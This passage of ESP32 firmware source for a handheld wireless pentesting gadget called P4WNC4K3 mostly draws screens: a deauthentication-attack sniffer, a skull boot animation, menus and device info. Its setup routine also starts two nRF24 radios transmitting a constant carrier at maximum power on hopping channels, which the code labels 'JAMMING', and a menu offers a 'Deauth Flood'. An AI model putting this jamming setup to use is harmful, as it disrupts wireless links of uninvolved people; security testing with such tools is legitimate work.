  deauthSnifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Deauth sniffer stopped");
  
  Serial.printf("[+] Deauth sniffer stopped - %d deauths detected\n", detectedDeauths);
}

void displayDeauthSnifferActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("deauth sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT single line with channel controls
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  
  // Channel display - show current channel being monitored
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.print("Ch:");
  
  // Current channel number (updates automatically)
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN + 18, statsY);
  tft.printf("%2d", snifferChannel);
  
  // Channel hopping indicator
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN + 40, statsY);
  tft.print("[AUTO]");
  
  // Deauth count
  tft.setTextColor(detectedDeauths > 0 ? COLOR_RED : COLOR_GREEN);
  tft.setCursor(95, statsY);
  tft.printf("Deauths:%d", detectedDeauths);
  
  // Alert if deauths detected
  if (detectedDeauths > 0) {
    tft.setTextColor(COLOR_RED);
    tft.setCursor(SIDE_MARGIN, statsY + 12);
    tft.print("! ATTACK DETECTED !");
  }
  
  // Column headers
  int listY = detectedDeauths > 0 ? HEADER_HEIGHT + 32 : HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("ATTACKER -> VICTIM");
  tft.setCursor(150, listY);
  tft.print("CH");
  tft.setCursor(175, listY);
  tft.print("PWR");
  tft.setCursor(205, listY);
  tft.print("AGE");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate safe display area - leave room for footer
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 26;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (deauthEventCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("No deauth attacks detected");
    
    tft.setCursor(SIDE_MARGIN, listY + 55);
    tft.setTextColor(COLOR_TEXT);
    tft.print("Network is clean");
    
    tft.setCursor(SIDE_MARGIN, listY + 75);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Auto-hopping Ch 1-13...");
  } else {
    // Calculate pagination
    int totalPages = (deauthEventCount + MAX_ITEMS - 1) / MAX_ITEMS;
    int currentPage = deauthScrollOffset / MAX_ITEMS;
    
    // Ensure scroll offset is valid
    if (deauthScrollOffset >= deauthEventCount) {
      deauthScrollOffset = max(0, deauthEventCount - MAX_ITEMS);
    }
    
    // Display events for current page (newest first)
    int startIdx = deauthScrollOffset;
    int endIdx = min(startIdx + MAX_ITEMS, deauthEventCount);
    
    for (int i = 0; i < (endIdx - startIdx); i++) {
      int idx = deauthEventCount - 1 - startIdx - i;  // Reverse order (newest first)
      
      if (idx < 0 || idx >= deauthEventCount) continue;
      
      int y = listY + (i * ITEM_HEIGHT);
      
      // Warning indicator
      tft.setTextColor(COLOR_RED);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y);
      tft.print("[!]");
      
      // Source MAC (attacker) - First 3 octets
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(SIDE_MARGIN + 18, y);
      tft.printf("%02X:%02X:%02X", 
                 deauthEvents[idx].sourceMAC[0],
                 deauthEvents[idx].sourceMAC[1],
                 deauthEvents[idx].sourceMAC[2]);
      
      // Arrow
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 64, y);
      tft.print("->");
      
      // Target MAC (victim) - First 3 octets
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(SIDE_MARGIN + 82, y);
      tft.printf("%02X:%02X:%02X", 
                 deauthEvents[idx].targetMAC[0],
                 deauthEvents[idx].targetMAC[1],
                 deauthEvents[idx].targetMAC[2]);
      
      // Channel
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(150, y);
      tft.printf("%2d", deauthEvents[idx].channel);
      
      // RSSI (power)
      int rssi = deauthEvents[idx].rssi;
      tft.setTextColor(rssi > -50 ? COLOR_RED : rssi > -70 ? COLOR_ORANGE : COLOR_YELLOW);
      tft.setCursor(175, y);
      tft.printf("%3d", rssi);
      
      // Time ago
      unsigned long ago = (millis() - deauthEvents[idx].timestamp) / 1000;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(205, y);
      if (ago < 60) {
        tft.printf("%2ds", ago);
      } else {
        tft.printf("%2dm", ago / 60);
      }
      
      // Second line: Full MACs (smaller text)
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 18, y + 10);
      tft.printf("A:%02X:%02X:%02X:%02X:%02X:%02X", 
                 deauthEvents[idx].sourceMAC[0], deauthEvents[idx].sourceMAC[1],
                 deauthEvents[idx].sourceMAC[2], deauthEvents[idx].sourceMAC[3],
                 deauthEvents[idx].sourceMAC[4], deauthEvents[idx].sourceMAC[5]);
      
      tft.setCursor(SIDE_MARGIN + 18, y + 18);
      tft.printf("V:%02X:%02X:%02X:%02X:%02X:%02X", 
                 deauthEvents[idx].targetMAC[0], deauthEvents[idx].targetMAC[1],
                 deauthEvents[idx].targetMAC[2], deauthEvents[idx].targetMAC[3],
                 deauthEvents[idx].targetMAC[4], deauthEvents[idx].targetMAC[5]);
    }
    
    // Scroll pagination indicator
    if (totalPages > 1) {
      int scrollY = FOOTER_Y;
      tft.drawFastHLine(0, scrollY, 240, COLOR_DARK_GREEN);
      tft.setTextSize(1);
      tft.setTextColor(COLOR_CYAN);
      
      char scrollText[30];
      sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage + 1, totalPages);
      int textWidth = strlen(scrollText) * 6;
      int centerX = (240 - textWidth) / 2;
      
      tft.setCursor(centerX, scrollY + 5);
      tft.print(scrollText);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

void handleDeauthSnifferMenuTouch(int x, int y) {
  // We're always in active state now, no menu
  if (currentState != DEAUTH_SNIFFER_ACTIVE) return;
  
  // Stop button (bottom) or anywhere really
  if (y > 280) {
    stopDeauthSniffer();
    currentState = MORE_TOOLS_MENU;
    hoveredIndex = -1;
    drawMoreToolsMenu();
    return;
  }
  
  // Scroll through deauth events (tap anywhere in middle)
  if (deauthEventCount > 0 && y > HEADER_HEIGHT + 40 && y < 270) {
    const int EVENTS_PER_PAGE = 9;
    int totalPages = (deauthEventCount + EVENTS_PER_PAGE - 1) / EVENTS_PER_PAGE;
    
    if (totalPages > 1) {
      int currentPage = deauthScrollOffset / EVENTS_PER_PAGE;
      currentPage = (currentPage + 1) % totalPages;
      deauthScrollOffset = currentPage * EVENTS_PER_PAGE;
      displayDeauthSnifferActive();
    }
  }
}

// In setup(), REPLACE the WiFi initialization section with:
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║     P4WNC4K3 PENTESTING DEVICE        ║");
  Serial.println("║         Initializing...                ║");
  Serial.println("╚═══════════════════════════════════════╝\n");
  
  // ==================== WATCHDOG TIMER ====================
  Serial.print("[*] Init Watchdog Timer... ");
  esp_task_wdt_init(30, true);
  esp_task_wdt_add(NULL);
  Serial.println("OK");
  
  // ==================== TFT DISPLAY ====================
  Serial.print("[*] Init TFT Display... ");
  tft.init();
  tft.setRotation(0);  // Portrait mode
  tft.fillScreen(COLOR_BG);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  Serial.println("OK");
  
  // Touch calibration
  uint16_t calData[5] = {275, 3620, 320, 3590, 4};
  tft.setTouch(calData);
  
  // ==================== WIFI INITIALIZATION ====================
  Serial.print("[*] Init WiFi subsystem... ");
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  esp_wifi_start();
  delay(100);
  Serial.println("OK");
  
  // ==================== SPIFFS INITIALIZATION ====================
  Serial.print("[*] Init SPIFFS... ");
  if (!SPIFFS.begin(true)) {
    Serial.println("FAIL - Formatting...");
    SPIFFS.format();
    SPIFFS.begin(true);
    Serial.println("OK (formatted)");
  } else {
    Serial.println("OK");
  }
  
  // ==================== nRF24 INITIALIZATION (OPTIMIZED) ====================
  Serial.println("\n[*] Initializing nRF24L01 modules...");
  Serial.println("    Using constant carrier method (Smoochiee)");

  // Init HSPI bus with 16 MHz speed
  Serial.print("    HSPI bus (16 MHz)... ");
  hspi.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI, -1);
  hspi.setFrequency(NRF_SPI_SPEED);  // ⬅️ CRITICAL: Set 16 MHz
  hspi.setDataMode(SPI_MODE0);
  hspi.setBitOrder(MSBFIRST);

  // Set CS and CE pins
  pinMode(NRF1_CSN_PIN, OUTPUT);
  pinMode(NRF2_CSN_PIN, OUTPUT);
  pinMode(NRF1_CE_PIN, OUTPUT);
  pinMode(NRF2_CE_PIN, OUTPUT);
  digitalWrite(NRF1_CSN_PIN, HIGH);
  digitalWrite(NRF2_CSN_PIN, HIGH);
  digitalWrite(NRF1_CE_PIN, LOW);
  digitalWrite(NRF2_CE_PIN, LOW);
  delay(100);
  Serial.println("OK");

  // ===== RADIO 1 INITIALIZATION =====
  Serial.print("[RADIO 1] CE=26, CSN=25... ");
  if (radio1.begin(&hspi)) {
    radio1.setDataRate(RF24_2MBPS);
    radio1.setAutoAck(false);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.setPALevel(RF24_PA_MAX);
    radio1.setRetries(0, 0);
    radio1.stopListening();
    
    // ✅ START CONSTANT CARRIER ONCE
    radio1.startConstCarrier(RF24_PA_MAX, hopping_channel[0]);
    delay(50);
    nrf1Available = true;
    Serial.println("✅ DETECTED - Carrier ON");
  } else {
    Serial.println("❌ NOT FOUND");
  }

  // ===== RADIO 2 INITIALIZATION =====
  Serial.print("[RADIO 2] CE=33, CSN=27... ");
  if (radio2.begin(&hspi)) {
    radio2.setDataRate(RF24_2MBPS);
    radio2.setAutoAck(false);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setPALevel(RF24_PA_MAX);
    radio2.setRetries(0, 0);
    radio2.stopListening();
    
    // ✅ START CONSTANT CARRIER ONCE
    radio2.startConstCarrier(RF24_PA_MAX, hopping_channel[ptr_hop2]);
    delay(50);
    nrf2Available = true;
    Serial.println("✅ DETECTED - Carrier ON");
  } else {
    Serial.println("❌ NOT FOUND");
  }

  // ===== STATUS SUMMARY =====
  Serial.println();
  if (nrf1Available && nrf2Available) {
    Serial.println("[+] DUAL nRF24 MODE - Both radios ready!");
    Serial.println("    Target: 50K-80K hops/sec (shared HSPI)");
    Serial.println("    Using 16 MHz SPI speed");
    addToConsole("DUAL nRF24 @ 16MHz");
    dualNRFMode = true;
  } else if (nrf1Available || nrf2Available) {
    Serial.println("[+] SINGLE nRF24 MODE - One radio ready");
    Serial.println("    Target: 30K-50K hops/sec");
    addToConsole("Single nRF24");
    dualNRFMode = false;
  } else {
    Serial.println("[!] WARNING: No nRF24 modules detected");
    addToConsole("WARNING: No nRF24!");
  }
  
  // ==================== BOOT ANIMATION ====================
  Serial.println("\n[*] Starting boot animation...");
  playBootAnimation();
  
  // ==================== CONSOLE INITIALIZATION ====================
  addToConsole("P4WNC4K3 initialized");
  addToConsole("System ready for pentest");
  
  // ==================== DRAW MAIN MENU ====================
  Serial.println("\n[+] System initialization complete!");
  Serial.println("    Ready for pentesting operations\n");
  
  currentState = MAIN_MENU;
  drawMainMenu();
  
  Serial.println("╔═══════════════════════════════════════╗");
  Serial.println("║         SYSTEM READY                   ║");
  Serial.println("╚═══════════════════════════════════════╝");
  Serial.println("\nType 'help' in serial console for commands");
  Serial.println();
}

#define COLOR_HEADER    0x0208  // Very dark blue-grey
#define COLOR_TEXT      0xCE79  // Light grey text
#define COLOR_SELECTED  0x07E0  // Matrix green (selected items)
#define COLOR_ITEM_BG   0x0208  // Very dark blue-grey (same as header)
#define COLOR_BORDER    0x0320  // Dark green border
#define COLOR_WARNING   0xFD20  // Orange
#define COLOR_SUCCESS   0x07E0  // Matrix green
#define COLOR_CRITICAL  0xC800  // Dark red
#define COLOR_ACCENT    0x07E0  // Matrix green (was Kali blue)
#define COLOR_PURPLE    0x8012  // Dark purple
#define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
#define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
#define COLOR_LIME          0x87F0  // Lime green accent

// New boot animation function
void playBootAnimation() {
  tft.fillScreen(COLOR_BG);
  
  // Display mask and modules together
  displayIntegratedBoot();
  
  // Done - go to main menu
  currentState = MAIN_MENU;
}

const char maskASCII[] PROGMEM = 
"cccccccccccahhhhhhaaaahhhhhaaccccccccccc\n"
"cccchacccccccccccccccccccccccccchhcccc\n"
"ccaccccccccccccccccccccccccccccccckcaccc\n"
"cchcccccccccccccccccccccccccccccccccchcc\n"
"cacccahhhhhhacccccccccccccchhhhhhhaccaac\n"
"chcchhhhhhhhhaccccccccccccahhhhhhhhhcchc\n"
"caccccccccahhhhhcccccccchhhhhaccccccccac\n"
"cacccccccccccahacccccccchhacccccccccccac\n"
"cccccccahaaaaachcccccccaacaaaaahacccccac\n"
"accccahhhhhhhhhhcaccccachhhhhhhhhhaccccc\n"
"acaaaahhhaaahhacchcccchccahaaaaahaaaaccc\n"
"acccccccccccccccahcccchccccccccccccccccc\n"
"accccccccccccccchhcccchhcccccccccccccccc\n"
"ccccccccccccccaaaacccchaaaccccccccccccac\n"
"caccccccccahhhccaaccccaccaahhcccccccccac\n"
"cachhhhhaccccccaahaccahaaccccccahhhhachc\n"
"chcchhahacccccccahhhahhccccccccahahaccac\n"
"ccacchhhhaacaaahhhhcchhhhaccachhahhcchcc\n"
"ccaccchhcahhhhhhhcccccahhhhhhhaahacccacc\n"
"ccchcccahacccccccccccccccccccaahaccchccc\n"
"cccchccccaccccccccaaaacccccccchccccacccc\n"
"cccccaacccacccccccahhcccccccccccchcccccc\n"
"cccccccaaccccccccchhhacccccccccaaccccccc\n"
"ccccccccchcccccccchhhhcccccccahccccccccc\n"
"ccccccccccchcccccchhhhcccccahccccccccccc\n"
"cccccccccccccahcccahhcccchaccccccccccccc\n"
"ccccccccccccccccahhhhhhacccccccccccccccc\n";

// ==================== OPTIMIZED BOOT WITH TALLER SLIMMER SKULL ====================
void displayIntegratedBoot() {
  tft.fillScreen(COLOR_BG);
  
  // ===== TOP: root@p4wnc4k3:~# init =====
  tft.setTextSize(1);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(5, 8);
  tft.print("root@p4wnc4k3:~# ");
  tft.setTextColor(COLOR_TEXT);
  tft.print("init");
  
  // Separator line
  int separatorY = 22;
  for (int x = 0; x < 240; x += 2) {
    tft.drawPixel(x, separatorY, COLOR_DARK_GREEN);
  }
  
  // ===== CENTERED ASCII MASK =====
  int lineCount = 27;
  int pixelsPerChar = 3;
  
  int maxLineWidth = 41;
  int totalMaskWidth = maxLineWidth * pixelsPerChar;
  int totalMaskHeight = lineCount * pixelsPerChar * 2; // Double height
  
  // Center horizontally AND vertically in the middle space
  int maskStartX = (240 - totalMaskWidth) / 2;
  int availableHeight = 320 - separatorY - 90; // Space between separator and modules
  int maskStartY = separatorY + ((availableHeight - totalMaskHeight) / 2);
  
  // Parse ASCII art
  char (*lines)[42] = new char[27][42];
  
  for (int i = 0; i < 27; i++) {
    for (int j = 0; j < 42; j++) {
      lines[i][j] = '\0';
    }
  }
  
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n') {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else if (linePos < 41) {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  if (lineIndex < 27 && linePos > 0) {
    lines[lineIndex][linePos] = '\0';
  }
  
  // ===== ANIMATE SKULL =====
  bool revealed[27][41];
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      revealed[y][x] = false;
    }
  }
  
  int totalPixels = 0;
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      char pixel = lines[y][x];
      if (pixel != 'c' && pixel != '\0') {
        totalPixels++;
      }
    }
  }
  
  int pixelsRevealed = 0;
  int animationSteps = 15;
  
  while (pixelsRevealed < totalPixels) {
    esp_task_wdt_reset();
    
    for (int step = 0; step < animationSteps && pixelsRevealed < totalPixels; step++) {
      int randY = random(0, 27);
      int randX = random(0, 41);
      
      if (revealed[randY][randX]) continue;
      
      char pixel = lines[randY][randX];
      
      if (pixel == 'c' || pixel == '\0') {
        revealed[randY][randX] = true;
        continue;
      }
      
      revealed[randY][randX] = true;
      pixelsRevealed++;
      
      int xPos = maskStartX + (randX * pixelsPerChar);
      int yPos = maskStartY + (randY * pixelsPerChar * 2);
      
      uint16_t color;
      if (pixel == 'h') color = COLOR_GREEN;
      else if (pixel == 'a') color = COLOR_DARK_GREEN;
      else if (pixel == 'k') color = COLOR_GREEN;
      else color = COLOR_GREEN;
      
      tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
    }
    
    delay(5);
  }
  
  delete[] lines;
  
  // ===== BOTTOM: MODULE LIST =====
  int moduleStartY = 230;
  
  const char* modules[] = {"WiFi", "BLE", "nRF#1", "nRF#2", "CC1101", "SPIFFS", "TFT"};
  bool moduleStatus[] = {true, true, nrf1Available, nrf2Available, true, true, true};
  
  for (int i = 0; i < 7; i++) {
    int y = moduleStartY + (i * 11);
    
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(8, y);
    tft.print("[");
    tft.setTextColor(COLOR_GREEN);
    tft.print("*");
    tft.setTextColor(COLOR_TEXT);
    tft.print("] ");
    tft.print(modules[i]);
    
    // Status
    uint16_t statusColor = moduleStatus[i] ? COLOR_GREEN : COLOR_ORANGE;
    String statusText = moduleStatus[i] ? "OK" : "X";
    
    tft.setTextColor(statusColor);
    tft.setCursor(80, y);
    tft.print(statusText);
    
    delay(80);
    esp_task_wdt_reset();
  }
  
  delay(300);
  
  // ===== FINAL MESSAGE =====
  int finalY = moduleStartY + (7 * 11) + 2;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(8, finalY);
  tft.print("[");
  tft.setTextColor(COLOR_GREEN);
  tft.print("+");
  tft.setTextColor(COLOR_TEXT);
  tft.print("]");
  tft.setTextColor(COLOR_RED);
  tft.print(" Ready to p4wn");
  delay(1500);
}

void addToConsole(String message) {
  consoleBuffer[consoleIndex] = message;
  consoleIndex = (consoleIndex + 1) % 15;
  Serial.println("[LOG] " + message);
}

// Improved header with better styling
void drawHeader(const char* title) {
  // Dark header with green accent
  drawTerminalHeader(title);
  
  // Console-style prompt
  tft.setTextColor(COLOR_RED);
  tft.setTextSize(1);
  tft.setCursor(5, 8);
  tft.print("root@p4wnc4k3:~# ");
  
  // Title
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(5, 18);
  tft.println(title);
}

void showMessage(const char* msg, uint16_t color) {
  int boxW = 200;
  int boxH = 60;
  int boxX = (240 - boxW) / 2;
  int boxY = (320 - boxH) / 2;
  
  // Semi-transparent overlay effect
  tft.fillRect(boxX, boxY, boxW, boxH, COLOR_BG);
  tft.drawRect(boxX, boxY, boxW, boxH, color);
  tft.drawRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, COLOR_DARK_GREEN);
  
  // Icon
  tft.setTextSize(1);
  tft.setTextColor(color);
  tft.setCursor(boxX + 10, boxY + 20);
  tft.print("[");
  if (color == COLOR_GREEN) tft.print("+");
  else if (color == COLOR_RED) tft.print("!");
  else if (color == COLOR_ORANGE) tft.print("*");
  else tft.print("i");
  tft.print("]");
  
  // Message
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(boxX + 30, boxY + 20);
  
  // Word wrap for long messages
  String message = String(msg);
  if (message.length() > 25) {
    String line1 = message.substring(0, 25);
    String line2 = message.substring(25);
    tft.println(line1);
    tft.setCursor(boxX + 10, boxY + 32);
    tft.print(line2);
  } else {
    tft.print(msg);
  }
  
  delay(800);
}

// PART 2/3 - Menu Drawing and Touch Handling Functions
// This continues from Part 1

void drawMainMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("main menu");
  
  const char* menuItems[] = {
    "WiFi",
    "Bluetooth",
    "Radio Frequency",
    "Security Monitoring",
    "Sniffers",
    "Settings/Utilities"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 6; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // System status at bottom
  tft.setTextSize(1);
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, 280);
  tft.printf("Heap: %dK | APs: %d", ESP.getFreeHeap() / 1024, networkCount);
  
  // Version
  tft.setCursor(SIDE_MARGIN, 295);
  tft.setTextColor(COLOR_CYAN);
  tft.print("P4WNC4K3 v1.0");
}

void drawWiFiMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi tools");
  
  const char* menuItems[] = {
    "Scan Networks",
    "Select Target",
    "Beacon Manager",
    "Deauth Flood"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 4; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, 250);
  tft.printf("Cached APs: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", networkCount);
  
  if (selectedSSID.length() > 0) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, 265);
    tft.print("Current target: ");
    tft.setTextColor(COLOR_YELLOW);
    String truncSSID = selectedSSID;
    if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
    tft.println(truncSSID);
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawSettingsMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("settings/utilities");
  
  const char* menuItems[] = {
    "Device Info",
    "SD Card",
    "Show ASCII Art",
    "Console",        // ← MOVED HERE
    "Reboot Device"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 5; i++) {  // Changed from 4 to 5
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawDeviceInfo() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("device info");
  
  int y = HEADER_HEIGHT + 15;
  
  // ✅ nRF24 #1 Status - REAL STATE
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("nRF24L01 #1:");
  
  uint16_t statusColor1 = COLOR_RED;
  const char* statusText1 = "NOT FOUND";
  
  if (nrf1Available) {
    if (nrfJammerActive) {
      statusColor1 = COLOR_ORANGE;
      statusText1 = "JAMMING";
    } else {
      statusColor1 = COLOR_GREEN;
      statusText1 = "READY";
    }
  }
  
  tft.setTextColor(statusColor1);
  tft.setCursor(140, y);
  tft.print(statusText1);
  
  y += 20;
  
  // ✅ nRF24 #2 Status - REAL STATE
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("nRF24L01 #2:");
  
  uint16_t statusColor2 = COLOR_RED;
  const char* statusText2 = "NOT FOUND";
  
  if (nrf2Available) {
    if (nrfJammerActive && dualNRFMode) {
      statusColor2 = COLOR_ORANGE;
      statusText2 = "JAMMING";
    } else if (nrf2Available) {
      statusColor2 = COLOR_GREEN;
      statusText2 = "READY";
    }
  }
  
  tft.setTextColor(statusColor2);
  tft.setCursor(140, y);
  tft.print(statusText2);
  
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Hardware Info
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Hardware Info:");
  y += 15;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Chip: ");
  tft.setTextColor(COLOR_TEXT);
  tft.println(ESP.getChipModel());
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("CPU: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d MHz", ESP.getCpuFreqMHz());
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Flash: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d MB", ESP.getFlashChipSize() / 1048576);
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Free Heap: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d KB", ESP.getFreeHeap() / 1024);
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("MAC: ");
  tft.setTextColor(COLOR_TEXT);
  String mac = WiFi.macAddress();
  if (mac.length() > 17) mac = mac.substring(0, 17);
  tft.println(mac);
  
  y += 20;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Developer info
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Developed by Shane Sahagun");
  y += 12;
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("(p4wnc4k3)");
  y += 15;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Purpose:");
  y += 10;
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Educational pentesting tool");
  y += 10;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("for authorized security");
  y += 10;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("assessments only.");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawASCIIArtViewer() {
  // Just black screen - skull will be drawn centered
  tft.fillScreen(COLOR_BG);
  
  // Draw centered skull animation
  displayASCIIArtCentered();
  
  // Set state so any touch will exit
  currentState = ASCII_ART_VIEWER;
}

void displayASCIIArtCentered() {
  int lineCount = 27;
  int pixelsPerChar = 3;
  
  int maxLineWidth = 41;
  int totalMaskWidth = maxLineWidth * pixelsPerChar;
  int totalMaskHeight = lineCount * pixelsPerChar * 2;
  
  int maskStartX = (240 - totalMaskWidth) / 2;
  int maskStartY = (320 - totalMaskHeight) / 2;
  
  // Parse ASCII art
  char (*lines)[42] = new char[27][42];
  
  for (int i = 0; i < 27; i++) {
    for (int j = 0; j < 42; j++) {
      lines[i][j] = '\0';
    }
  }
  
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n') {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else if (linePos < 41) {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  if (lineIndex < 27 && linePos > 0) {
    lines[lineIndex][linePos] = '\0';
  }
  
  bool revealed[27][41];
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      revealed[y][x] = false;
    }
  }
  
  int totalPixels = 0;
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      char pixel = lines[y][x];
      if (pixel != 'c' && pixel != '\0') {
        totalPixels++;
      }
    }
  }
  
  int pixelsRevealed = 0;
  int animationSteps = 15;
  
  while (pixelsRevealed < totalPixels) {
    esp_task_wdt_reset();
    
    for (int step = 0; step < animationSteps && pixelsRevealed < totalPixels; step++) {
      int randY = random(0, 27);
      int randX = random(0, 41);
      
      if (revealed[randY][randX]) continue;
      
      char pixel = lines[randY][randX];
      
      if (pixel == 'c' || pixel == '\0') {
        revealed[randY][randX] = true;
        continue;
      }
      
      revealed[randY][randX] = true;
      pixelsRevealed++;
      
      int xPos = maskStartX + (randX * pixelsPerChar);
      int yPos = maskStartY + (randY * pixelsPerChar * 2);
      
      uint16_t color;
      if (pixel == 'h') color = COLOR_GREEN;
      else if (pixel == 'a') color = COLOR_DARK_GREEN;
      else if (pixel == 'k') color = COLOR_GREEN;
      else color = COLOR_GREEN;
      
      tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
    }
    
    delay(5);
  }
  
  delete[] lines;
}

void displayIntegratedBootCentered() {
  // Same mask rendering as boot, but centered vertically
  int lineCount = 27;
  int pixelsPerChar = 3;
  
  int maxLineWidth = 41;
  int totalMaskWidth = maxLineWidth * pixelsPerChar;
  int totalMaskHeight = lineCount * pixelsPerChar * 2; // Height doubled
  
